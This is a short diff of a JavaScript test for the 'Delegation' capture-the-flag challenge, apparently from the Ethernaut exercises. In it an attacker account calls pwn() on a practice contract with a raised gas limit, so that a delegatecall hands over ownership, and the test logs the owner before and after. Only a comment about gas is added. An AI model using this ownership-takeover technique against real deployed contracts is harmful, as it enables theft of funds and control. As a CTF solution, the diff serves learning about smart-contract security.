@@ -31,7 +31,9 @@ describe('[Challenge] Delegation', function () {
         let abi = ["function pwn()"];
         const contract = new ethers.Contract(this.target.address, abi, ethers.provider);
         console.log(`\t owner before: ${await this.target.owner()}`);
-        let pwntx = await contract.connect(attacker).pwn({gasLimit:200000}); await pwntx.wait();
+        let pwntx = await contract.connect(attacker).pwn({
+            gasLimit:200000 // Default gaslimit is around 28K, which is may not enough for delgatecall. Let's increase it to 200K.
+        }); await pwntx.wait();
         console.log(`\t owner after : ${await this.target.owner()}`);
         console.log(`\t attacker    : ${attacker.address}`);
     }).timeout(0);
